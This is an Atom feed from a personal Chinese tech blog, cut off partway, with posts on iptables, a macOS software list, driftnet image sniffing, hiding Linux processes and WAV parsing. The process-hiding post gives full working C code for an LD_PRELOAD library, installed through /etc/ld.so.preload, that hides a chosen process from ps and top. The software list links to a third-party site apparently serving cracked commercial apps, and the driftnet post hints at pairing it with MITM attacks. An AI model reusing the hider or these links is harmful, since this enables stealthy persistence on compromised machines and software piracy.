<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Vincent&#39;Studio</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://vincentstudio.info/"/>
  <updated>2019-06-18T01:08:27.159Z</updated>
  <id>https://vincentstudio.info/</id>
  
  <author>
    <name>Vincent</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>iptables 详解</title>
    <link href="https://vincentstudio.info/2019/06/16/033%20Port%20Forwarding%20Tutorial/"/>
    <id>https://vincentstudio.info/2019/06/16/033 Port Forwarding Tutorial/</id>
    <published>2019-06-16T06:00:00.000Z</published>
    <updated>2019-06-18T01:08:27.159Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>说道端口转发大家一定不陌生，路由器上经常操作端口映射，把内网端口映射到路由器端口，从而通过路由器的公网 IP 便可以访问内网端口。这一切归功于 iptables，当然 iptables 除了做端口转发，还有非常多的其他功能，本文就来详细介绍一下 iptables，并提供一些常用案例。</p></blockquote><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p><code>iptables</code> 是一种 IP 信息包过滤系统，包含4个表，5个链。其中表是按照对数据包的操作区分的，链是按照不同的Hook点来区分的，具体包含关系为 <code>iptables</code> -&gt; <code>Tables</code> -&gt; <code>Chains</code> -&gt; <code>Rules</code>。其实 iptables 不是真正的防火墙，我们可以把它理解成一个客户端代理，用户通过 <code>iptables</code> 这个代理，将用户的安全设定执行到对应的”安全框架”中，这个”安全框架”才是真正的防火墙，这个框架的名字叫 <code>netfilter</code>。</p><h3 id="四个表"><a href="#四个表" class="headerlink" title="四个表"></a>四个表</h3><ul><li><code>FILTTER</code>：一般的过滤功能</li><li><code>NAT</code>：用于nat功能（端口映射，地址映射等）</li><li><code>MANGLE</code>：用于对特定数据包的修改</li><li><code>RAW</code>：优先级最高，设置raw时一般是为了不再让iptables做数据包的链接跟踪处理，提高性能</li></ul><h3 id="五个链"><a href="#五个链" class="headerlink" title="五个链"></a>五个链</h3><ul><li><code>PREROUTING</code>：数据包进入路由表之前</li><li><code>INPUT</code>：通过路由表后目的地为本机</li><li><code>FORWARD</code>：通过路由表后，目的地不为本机</li><li><code>OUTPUT</code>：由本机产生，向外转发</li><li><code>POSTROUTIONG</code>：发送到网卡接口之前</li></ul><h3 id="包含关系"><a href="#包含关系" class="headerlink" title="包含关系"></a>包含关系</h3><img src="/images/loading.gif" data-original="/2019/06/16/033%20Port%20Forwarding%20Tutorial/relationships.png"><h3 id="数据流图"><a href="#数据流图" class="headerlink" title="数据流图"></a>数据流图</h3><img src="/images/loading.gif" data-original="/2019/06/16/033%20Port%20Forwarding%20Tutorial/workflow.png"><h2 id="实用案例"><a href="#实用案例" class="headerlink" title="实用案例"></a>实用案例</h2><h3 id="开始、停止、重启-iptables-服务"><a href="#开始、停止、重启-iptables-服务" class="headerlink" title="开始、停止、重启 iptables 服务"></a>开始、停止、重启 iptables 服务</h3><pre><code class="lang-bash">$ systemctl start iptables$ systemctl stop iptables$ systemctl restart iptables</code></pre><h3 id="查看所有规则"><a href="#查看所有规则" class="headerlink" title="查看所有规则"></a>查看所有规则</h3><pre><code class="lang-bash">$ iptables -L -n -v# 具体看某个表的规则，如 nat$ iptables -t nat -L -n -v</code></pre><ul><li><code>-L</code> list，列举规则</li><li><code>-n</code> numeric，显示ip地址</li><li><code>-v</code> verbose，详细输出</li></ul><h3 id="清空所有规则"><a href="#清空所有规则" class="headerlink" title="清空所有规则"></a>清空所有规则</h3><pre><code class="lang-bash"># 清除默认 FILTER 链$ iptables -F# 清除 nat 表中的所有链$ iptables -t nat -F</code></pre><ul><li><code>-F</code> flush，清空规则</li></ul><h3 id="保存、恢复-iptables"><a href="#保存、恢复-iptables" class="headerlink" title="保存、恢复 iptables"></a>保存、恢复 iptables</h3><pre><code class="lang-bash"># 保存 iptables 规则到文件$ iptables-save &gt; ~/iptables.rules# 从文件恢复 iptables 规则$ iptables-restore &lt; ~/iptables.rules</code></pre><h3 id="屏蔽某个IP地址"><a href="#屏蔽某个IP地址" class="headerlink" title="屏蔽某个IP地址"></a>屏蔽某个IP地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果你想取消屏蔽</p><pre><code class="lang-bash">$ iptables -D INPUT -s xxx.xxx.xxx.xxx -j DROP</code></pre><p>如果只是想屏蔽 tcp 流量</p><pre><code class="lang-bash">$ iptables -A INPUT -p tcp -s xxx.xxx.xxx.xxx -j DROP</code></pre><ul><li><code>-A [chain]</code> append，增加规则</li><li><code>-D [chain]</code> delete，删除规则</li><li><code>-s [address/mask[...]]</code> source，源地址</li><li><code>-j [target]</code> jump，处理动作 </li><li><code>-p [proto]</code> protocol，协议，<code>icmp</code>、<code>tcp</code>、<code>udp</code> 等</li></ul><h3 id="屏蔽某个端口"><a href="#屏蔽某个端口" class="headerlink" title="屏蔽某个端口"></a>屏蔽某个端口</h3><pre><code class="lang-bash"># 屏蔽从8080端口传出的连接$ iptables -A OUTPUT -p tcp --dport 8080 -j DROP# 屏蔽传入8080端口的连接$ iptables -A INPUT -p tcp --dport 8080 -j ACCEPT# 屏蔽多个端口的$ iptables -A INPUT  -p tcp -m multiport --dports 22,80,443 -j ACCEPT$ iptables -A OUTPUT -p tcp -m multiport --sports 22,80,443 -j ACCEPT</code></pre><h3 id="屏蔽某个MAC地址"><a href="#屏蔽某个MAC地址" class="headerlink" title="屏蔽某个MAC地址"></a>屏蔽某个MAC地址</h3><pre><code class="lang-bash">$ iptables -A INPUT -m mac --mac-source 00:00:00:00:00:00 -j DROP</code></pre><h3 id="设置端口转发"><a href="#设置端口转发" class="headerlink" title="设置端口转发"></a>设置端口转发</h3><pre><code class="lang-bash"># 设置允许转发 $ echo 1 &gt; /proc/sys/net/ipv4/ip_forward# 发往本地 80 端口的流量转发到本地 10000 端口（sslstrip 常用）$ iptables -t nat -A PREROUTING -p tcp –destination-port 80 -j REDIRECT –to-port 10000# 在主机 A 上设置，访问[ip_a]:[port_a] 就相当于访问 [ip_b]:[port_b]，[ip_a] 不能是 lo 地址$ iptables -t nat -A PREROUTING -d [ip_a] -p tcp --dport [port_a] -j DNAT --to-destination [ip_b]:[port_b] $ iptables -t nat -A POSTROUTING -d [ip_b] -p tcp --dport [port_b] -j SNAT --to-source [ip_a]</code></pre><ul><li><code>-i [interface]</code> 网卡名</li></ul><h3 id="禁止-Ping，即屏蔽-ICMP-协议"><a href="#禁止-Ping，即屏蔽-ICMP-协议" class="headerlink" title="禁止 Ping，即屏蔽 ICMP 协议"></a>禁止 Ping，即屏蔽 ICMP 协议</h3><pre><code class="lang-bash">$ iptables -A INPUT -p icmp -i eth0 -j DROP</code></pre><h3 id="限制连接数"><a href="#限制连接数" class="headerlink" title="限制连接数"></a>限制连接数</h3><pre><code class="lang-bash"># 限制端口的连接数$ iptables -A INPUT -p tcp --dport 80 -m limit --limit 100/minute --limit-burst 200 -j ACCEPT# 限制并发的连接数，例如允许每个客户端最多建立3个ssh连接$ iptables -A INPUT -p tcp --syn --dport 22 -m connlimit --connlimit-above 3 -j REJECT</code></pre><ul><li><code>--limit 100/minute</code> 传入连接限制为100个每分钟</li><li><code>--limit-burst 200</code> 仅当连接总数达到200个以后才开始限制连接数</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Programming" scheme="https://vincentstudio.info/categories/Programming/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>MacOS 自用软件收藏清单（附下载链接）</title>
    <link href="https://vincentstudio.info/2019/06/15/032%20OSX%20Cracked%20Software%20Resources/"/>
    <id>https://vincentstudio.info/2019/06/15/032 OSX Cracked Software Resources/</id>
    <published>2019-06-15T14:00:00.000Z</published>
    <updated>2019-06-16T05:57:16.285Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文收录了自己在 MacOS 上常用的软件，附有第三方下载页面链接，如果链接崩了请在下方留言告知，也欢迎大家分享补充。</p></blockquote><h2 id="效率工具"><a href="#效率工具" class="headerlink" title="效率工具"></a>效率工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Alfred</td><td>Spotlight终极加强版，效率神器不解释</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/alfred.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Things</td><td>时间管理，任务管理</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/things.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Fantastical</td><td>优雅的日历软件，非常好用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/fantastical.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Karabiner-Elements</td><td>改键神器</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/karabiner-elements.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Unclutter</td><td>剪贴板工具，也可以临时记记笔记，很实用</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/unclutter.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Paste</td><td>剪贴板管理，支持回溯、分类，界面很酷炫</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/paste-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Vanilla</td><td>菜单栏图标管理</td><td><span style="font-size:20px;line-height:20px">★★★★☆</span></td><td><a href="https://xclient.info/s/vanilla.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Übersicht</td><td>桌面自定义React小部件</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://github.com/felixhageloh/uebersicht" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="系统工具"><a href="#系统工具" class="headerlink" title="系统工具"></a>系统工具</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>CleanMyMac</td><td>强大酷炫的系统清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/cleanmymac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>App Cleaner</td><td>软件清理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/app-cleaner-uninstaller-pro.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Parallels Desktop</td><td>虚拟机解决方案</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/parallels-desktop.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>balenaEtcher</td><td>启动盘制作工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/balena-io/etcher/releases" target="_blank" rel="noopener">Download</a></td></tr><tr><td>iStat Menus</td><td>炫酷的系统监控工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/istat-menus-for-mac.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Snagit</td><td>强大的截屏软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snagit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Free Download Manager</td><td>多线程下载工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://www.freedownloadmanager.org/zh/" target="_blank" rel="noopener">Download</a></td></tr><tr><td>TeamViewer</td><td>远程控制</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/teamviewer.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Transmit</td><td>FTP客户端</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/transmit.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>WiFi Scanner</td><td>无线网络扫描管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/wifi-scanner.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Gas Mask</td><td>系统 hosts 文件修改器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/gas-mask.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="开发相关"><a href="#开发相关" class="headerlink" title="开发相关"></a>开发相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>SnippetsLab</td><td>构建你的私人代码片段库</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/snippetslab.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Navicat Premium</td><td>强大的数据库管理工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/navicat-premium.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>Mathematica</td><td>数学计算工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href>Download</a></td></tr><tr><td>Expressions</td><td>正则表达式工具</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/expressions.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>File Juicer</td><td>无损文件提取器</td><td><span style="font-size:20px;line-height:20px">★★★</span></td><td><a href="https://xclient.info/s/file-juicer.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>OmniPlan</td><td>项目管理流程软件</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omni-plan.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>OmniGraffle</td><td>图表绘制工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/omnigraffle.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>XMind: ZEN</td><td>思维导图</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/xmind-zen.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>MarginNote</td><td>PDF阅读笔记工具</td><td><span style="font-size:20px;line-height:20px">★★★★</span></td><td><a href="https://xclient.info/s/marginnote-pro.html" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div><h2 id="媒体相关"><a href="#媒体相关" class="headerlink" title="媒体相关"></a>媒体相关</h2><div class="table-container"><table><thead><tr><th>名称</th><th>描述</th><th>实用程度</th><th>下载连接</th></tr></thead><tbody><tr><td>Boom 3D</td><td>音效增强工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://xclient.info/s/boom-3d.html" target="_blank" rel="noopener">Download</a></td></tr><tr><td>INNA</td><td>功能强大的开源媒体播放工具</td><td><span style="font-size:20px;line-height:20px">★★★★★</span></td><td><a href="https://github.com/iina/iina" target="_blank" rel="noopener">Download</a></td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Resources" scheme="https://vincentstudio.info/categories/Resources/"/>
    
    
      <category term="Software" scheme="https://vincentstudio.info/tags/Software/"/>
    
  </entry>
  
  <entry>
    <title>利用 driftnet 嗅探网络图片</title>
    <link href="https://vincentstudio.info/2019/05/24/031%20Driftnet%20Tutorial/"/>
    <id>https://vincentstudio.info/2019/05/24/031 Driftnet Tutorial/</id>
    <published>2019-05-24T14:18:00.000Z</published>
    <updated>2019-06-15T13:02:10.118Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>driftnet 是 Kali Linux 中内置的一个网络图片嗅探工具，常配合 ettercap、arpsproof 或其他 arp 欺骗工具一起使用。因为在 MacOS 上安装的时候遇到了一些困难，故做此记录，方便以后查阅。以后有时间可以详细介绍一下 arp 攻击原理。本文纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="安装教程"><a href="#安装教程" class="headerlink" title="安装教程"></a>安装教程</h2><p>在 Ubuntu 或者 Kali 上安装较为简单，就不多做介绍，下面安装教程只针对 macOS。网上很多用 macports 的安装教程都不能用了，目前在 mac 上只能通过源码编译安装。</p><pre><code class="lang-bash">$ git clone https://github.com/deiv/driftnet.git$ cd driftnet$ autoreconf -fi$ ./configure$ make -j8$ make install</code></pre><h2 id="报错及解决方案"><a href="#报错及解决方案" class="headerlink" title="报错及解决方案"></a>报错及解决方案</h2><ul><li>gtk 问题</li></ul><p>把 configure 中所有 x11 替换成 quartz，下面脚本中 gtk 版本可能不一致，请自行替换。</p><pre><code class="lang-bash">sed -i &#39;.backup&#39; &#39;s/x11/quartz/g&#39; configure &amp;&amp; rm configure.backupcd /usr/local/Cellar/gtk+/2.24.31_1/include/gtk-2.0/gdkln -s gdk.h gdkx.hcd -</code></pre><ul><li>提示找不到 openssl</li></ul><pre><code class="lang-bash">export LDFLAGS=&quot;-L/usr/local/opt/openssl/lib -L/usr/local/lib -L/usr/local/opt/expat/lib&quot;export CFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export CPPFLAGS=&quot;-I/usr/local/opt/openssl/include/ -I/usr/local/include -I/usr/local/opt/expat/include&quot;export LIBRARY_PATH=/usr/local/opt/openssl/lib</code></pre><ul><li>ehter.h 报错</li></ul><p>编辑 src/network/layer2.c </p><pre><code class="lang-c++">#include &lt;netinet/ether.h&gt;替换成#include &lt;netinet/if_ether.h&gt;</code></pre><ul><li>编辑 src/compat/config.h</li></ul><p>在末尾追加</p><pre><code class="lang-c++">#ifndef _FUCK_ETHER__#define _FUCK_ETHER__#define ETH_ALEN 6 #define ETH_HLAN 14 #define ETH_ZLEN 60 #define ETH_DATA_LEN 1500 #define ETH_FRAME_LEN 1514 #define ETH_FCS_LEN 4  #define ETH_P_IP 0x0800#define ETH_P_IPV6 0x86DD#define ETH_P_ARP 0x0806#define ETH_P_PAE 0x888Estruct ethhdr{    unsigned char h_dest[ETH_ALEN];    unsigned char h_source[ETH_ALEN];    unsigned short h_proto;}__attribute__((packed));#endif</code></pre><h2 id="使用演示"><a href="#使用演示" class="headerlink" title="使用演示"></a>使用演示</h2><pre><code>$ driftnet -i en0 # 你的网卡名</code></pre><p>打开浏览器看一些图片，发现图片内容已经被捕获到了。</p><img src="/images/loading.gif" data-original="/2019/05/24/031%20Driftnet%20Tutorial/driftnet.png"><p>如果再配合 MITM，你懂的。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Hacking" scheme="https://vincentstudio.info/categories/Hacking/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
      <category term="Hacking" scheme="https://vincentstudio.info/tags/Hacking/"/>
    
  </entry>
  
  <entry>
    <title>如何隐藏 Linux 进程</title>
    <link href="https://vincentstudio.info/2019/05/19/030%20How%20to%20Hide%20Linux%20Process/"/>
    <id>https://vincentstudio.info/2019/05/19/030 How to Hide Linux Process/</id>
    <published>2019-05-19T15:50:00.000Z</published>
    <updated>2019-07-18T08:03:22.330Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>本文旨在学习 linux 内核原理，纯粹用于技术探讨，请勿用于非法目的。</p></blockquote><h2 id="ps指令是如何工作的？"><a href="#ps指令是如何工作的？" class="headerlink" title="ps指令是如何工作的？"></a><code>ps</code>指令是如何工作的？</h2><p>我们可以使用 <code>sysdig</code> 跟踪 <code>ps</code> 指令的执行细节</p><pre><code class="lang-bash">$ sysdig proc.name = ps...2088196 23:47:45.419817127 7 ps (22956) &gt; openat2088197 23:47:45.419818054 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/stat) dirfd=-100(AT_FDCWD) name=/proc/30245/stat flags=1(O_RDONLY) mode=02088198 23:47:45.419818411 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/stat) size=20482088199 23:47:45.419819843 7 ps (22956) &lt; read res=182 data=30245 ((sd-pam)) S 30244 30244 30244 0 -1 1077936448 46 0 0 0 0 0 0 0 20 0 1 0 12088200 23:47:45.419820050 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/stat)2088201 23:47:45.419820178 7 ps (22956) &lt; close res=02088202 23:47:45.419822308 7 ps (22956) &gt; openat2088203 23:47:45.419824137 7 ps (22956) &lt; openat fd=6(&lt;f&gt;/proc/30245/status) dirfd=-100(AT_FDCWD) name=/proc/30245/status flags=1(O_RDONLY) mode=02088204 23:47:45.419824495 7 ps (22956) &gt; read fd=6(&lt;f&gt;/proc/30245/status) size=20482088205 23:47:45.419829683 7 ps (22956) &lt; read res=1329 data=Name:.(sd-pam).Umask:.0002.State:.S (sleeping).Tgid:.30245.Ngid:.0.Pid:.30245.PP2088206 23:47:45.419829879 7 ps (22956) &gt; close fd=6(&lt;f&gt;/proc/30245/status)2088207 23:47:45.419830002 7 ps (22956) &lt; close res=02088208 23:47:45.419831829 7 ps (22956) &gt; getdents fd=5(&lt;d&gt;/proc)2088209 23:47:45.419833030 7 ps (22956) &lt; getdents res=02088210 23:47:45.419834153 7 ps (22956) &gt; close fd=5(&lt;d&gt;/proc)2088211 23:47:45.419834873 7 ps (22956) &lt; close res=0...</code></pre><p>由此可以分析出 <code>ps</code> 的执行流程如下：</p><ol><li>通过 <code>openat</code> 函数打开目录 <code>/proc</code>。</li><li>在该进程在打开的目录上调用 <code>getdents</code> 函数，得到 <code>/proc</code> 下的目录列表</li><li>遍历每个子目录中的一组固定文件。从事件列表中可以看到，这些文件名为 <code>/proc/{PID}/status</code>，<code>/proc/PID/stat</code> 和 <code>/proc/PID/cmdline</code>，即为 <code>ps</code> 输出的信息。</li></ol><blockquote><p>进程本身不直接调用 <code>openat</code> 和 <code>getdents</code>， 因为这些是由C标准库（<code>libc</code>）抽象的系统调用。如果你曾经读过 <code>libc</code> 文档，<code>libc</code> 提供了两个不同的函数，<code>opendir</code> 和 <code>readdir</code>，它们负责自己调用系统调用，为开发人员提供了一个更简单的API。</p></blockquote><h2 id="3种隐藏进程的思路"><a href="#3种隐藏进程的思路" class="headerlink" title="3种隐藏进程的思路"></a>3种隐藏进程的思路</h2><ol><li>修改替换类似 <code>ps</code>、<code>lsof</code>、<code>top</code>、<code>htop</code> … 等常用运维工具的二进制文件。</li><li>覆盖 <code>libc</code> 中的 <code>readdir</code> 函数</li><li>修改内核中的系统调用，hook 系统的 <code>getdents</code> 事件</li></ol><p>下文采用第二种方法来实现</p><h2 id="示例代码-C"><a href="#示例代码-C" class="headerlink" title="示例代码 (C)"></a>示例代码 (C)</h2><h3 id="新建-processhider-c"><a href="#新建-processhider-c" class="headerlink" title="新建 processhider.c"></a>新建 <code>processhider.c</code></h3><p>修改 <code>process_to_filter</code> 为你要隐藏的进程名</p><pre><code class="lang-c">#define _GNU_SOURCE#include &lt;stdio.h&gt;#include &lt;dlfcn.h&gt;#include &lt;dirent.h&gt;#include &lt;string.h&gt;#include &lt;unistd.h&gt;// !!! Replace to your Process Namestatic const char* process_to_filter = &quot;test.py&quot;;static int get_dir_name(DIR* dirp, char* buf, size_t size){    int fd = dirfd(dirp);    if(fd == -1) {        return 0;    }    char tmp[64];    snprintf(tmp, sizeof(tmp), &quot;/proc/self/fd/%d&quot;, fd);    ssize_t ret = readlink(tmp, buf, size);    if(ret == -1) {        return 0;    }    buf[ret] = 0;    return 1;}static int get_process_name(char* pid, char* buf){    if(strspn(pid, &quot;0123456789&quot;) != strlen(pid)) {        return 0;    }    char tmp[256];    snprintf(tmp, sizeof(tmp), &quot;/proc/%s/stat&quot;, pid);    FILE* f = fopen(tmp, &quot;r&quot;);    if(f == NULL) {        return 0;    }    if(fgets(tmp, sizeof(tmp), f) == NULL) {        fclose(f);        return 0;    }    fclose(f);    int unused;    sscanf(tmp, &quot;%d (%[^)]s&quot;, &amp;unused, buf);    return 1;}#define DECLARE_READDIR(dirent, readdir)                                \static struct dirent* (*original_##readdir)(DIR*) = NULL;               \                                                                        \struct dirent* readdir(DIR *dirp)                                       \{                                                                       \    if(original_##readdir == NULL) {                                    \        original_##readdir = dlsym(RTLD_NEXT, #readdir);                \        if(original_##readdir == NULL)                                  \        {                                                               \            fprintf(stderr, &quot;Error in dlsym: %s\n&quot;, dlerror());         \        }                                                               \    }                                                                   \                                                                        \    struct dirent* dir;                                                 \                                                                        \    while(1)                                                            \    {                                                                   \        dir = original_##readdir(dirp);                                 \        if(dir) {                                                       \            char dir_name[256];                                         \            char process_name[256];                                     \            if(get_dir_name(dirp, dir_name, sizeof(dir_name)) &amp;&amp;        \                strcmp(dir_name, &quot;/proc&quot;) == 0 &amp;&amp;                       \                get_process_name(dir-&gt;d_name, process_name) &amp;&amp;          \                strcmp(process_name, process_to_filter) == 0) {         \                continue;                                               \            }                                                           \        }                                                               \        break;                                                          \    }                                                                   \    return dir;                                                         \}DECLARE_READDIR(dirent64, readdir64);DECLARE_READDIR(dirent, readdir);</code></pre><h3 id="编译成动态链接库"><a href="#编译成动态链接库" class="headerlink" title="编译成动态链接库"></a>编译成动态链接库</h3><pre><code class="lang-bash">$ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl$ mv libprocesshider.so /usr/local/lib/</code></pre><h3 id="覆盖系统调用"><a href="#覆盖系统调用" class="headerlink" title="覆盖系统调用"></a>覆盖系统调用</h3><p><code>/etc/ld.so.preload</code> 这是个神奇的文件，写在这个文件里的库会比系统标准库优先调用。因此我们只要把刚才生成好的动态链接库添加到这个文件中就大功告成了</p><pre><code class="lang-bash">$ echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</code></pre><h3 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h3><p>新建一个测试文件 <code>test.py</code></p><pre><code class="lang-python">#!/usr/bin/pythonwhile True:    print &quot;Hello&quot;</code></pre><p>执行</p><pre><code class="lang-bash">$ chmod +x test.py$ ./test.py</code></pre><p>再开一个 <code>terminal</code> 查看 <code>ps</code> 或者 <code>top</code>，发现 <code>test.py</code> 已经不见了。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="Hacking" scheme="https://vincentstudio.info/categories/Hacking/"/>
    
    
      <category term="Linux" scheme="https://vincentstudio.info/tags/Linux/"/>
    
      <category term="Hacking" scheme="https://vincentstudio.info/tags/Hacking/"/>
    
  </entry>
  
  <entry>
    <title>WAV 音频文件格式解析</title>
    <link href="https://vincentstudio.info/2019/05/15/029%20WAV%20Format%20Parsing/"/>
    <id>https://vincentstudio.info/2019/05/15/029 WAV Format Parsing/</id>
    <published>2019-05-15T13:55:00.000Z</published>
    <updated>2019-06-15T13:02:23.260Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>由于最近工作中使用到了多路音频采样数据的处理，故补充一波wav格式解析的知识，本文大部分资料来源于网络，我只做了收集归纳的工作。下方附有原文连接，若有侵权，请在下方留言告知。</p></blockquote><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>Waveform Audio File Format（WAVE，又或者是因为WAV后缀而被大众所知的），它采用RIFF（Resource Interchange File Format）文件格式结构。通常用来保存PCM格式的原始音频数据，所以通常被称为无损音频。但是严格意义上来讲，WAV也可以存储其它压缩格式的音频数据。</p><h2 id="格式解析"><a href="#格式解析" class="headerlink" title="格式解析"></a>格式解析</h2><p>WAV文件遵循RIFF规则，其内容以区块（chunk）为最小单位进行存储。WAV文件一般由3个区块组成：RIFF chunk、Format chunk和Data chunk。另外，文件中还可能包含一些可选的区块，如：Fact chunk、Cue points chunk、Playlist chunk、Associated data list chunk等。<br>本文将只介绍RIFF chunk、Format chunk和Data chunk。</p><img src="/images/loading.gif" data-original="/2019/05/15/029%20WAV%20Format%20Parsing/wav_format.png"><h3 id="RIFF区块"><a 